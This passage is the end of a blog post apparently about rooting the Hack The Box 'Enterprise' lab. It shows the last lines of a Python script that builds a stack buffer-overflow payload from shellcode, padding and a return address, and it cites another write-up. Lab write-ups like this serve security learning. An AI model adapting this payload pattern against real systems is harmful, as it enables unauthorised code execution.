+<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">padding</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nops</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">addr</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+<span class="k">print</span> <span class="n">payload</span>
+</code></pre></div></div><p>This is similar to the first approach I tried not including the ENV stuff, but mine was not working for some reasons.</p><h2 id="references"> References <a href="#references">#</a></h2><ul><li><table><tbody><tr><td>[HTB: Enterprise</td><td>0xdf hacks stuff](https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html#shell-as-root)</td></tr></tbody></table></li></ul></section><section><nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/spindel/2022/03/28/dpapi"><div class="nav-arrow">Previous</div><span class="post-title">DPAPI (Data Protection API)</span> </a> <a class="post-nav-item post-nav-next" href="/spindel/2022/04/03/complicated-sql-payloads"><div class="nav-arrow">Next</div><span class="post-title">Complicated SQL Payloads</span> </a></nav></section><div id="disqus_thread" class="article-comments"></div><script> (function() { var d = document, s = d.createElement('script'); s.src = '//powex.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></main><script> function setTheme(theme) { if (theme === "dark") { document.documentElement.setAttribute('data-theme', 'dark'); window.localStorage.setItem('theme', 'dark'); document.getElementById("theme-toggle").classList.add('sun'); document.getElementById("theme-toggle").classList.remove('moon'); } else { document.documentElement.setAttribute('data-theme', 'light'); window.localStorage.setItem('theme', 'light'); document.getElementById("theme-toggle").classList.add('moon'); document.getElementById("theme-toggle").classList.remove('sun'); } } let theme = localStorage.getItem('theme'); theme = theme || (window.matchMedia ? window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light' : 'light'); setTheme(theme); function modeSwitcher() { let currentMode = document.documentElement.getAttribute('data-theme'); if (currentMode === "dark") { setTheme('light'); } else { setTheme('dark'); } } </script></body><footer class="social-footer"><div class="social-footer-icons"> <a href="https://github.com/mvineza" title="Github profile, nothing much there, yet" target="_blank" rel="noopener noreferrer"><i class="fa fa-github" aria-hidden="true"></i></a> <a href="https://mvineza.github.io/spindel/atom.xml" title="Feed RSS" target="_blank" rel="noopener noreferrer"><i class="fa fa-rss" aria-hidden="true"></i></a> <a href="https://github.com/mvineza/spindel" title="Browse the code" target="_blank" rel="noopener noreferrer"><i class="fa fa-code" aria-hidden="true"></i></a></div></footer></html>
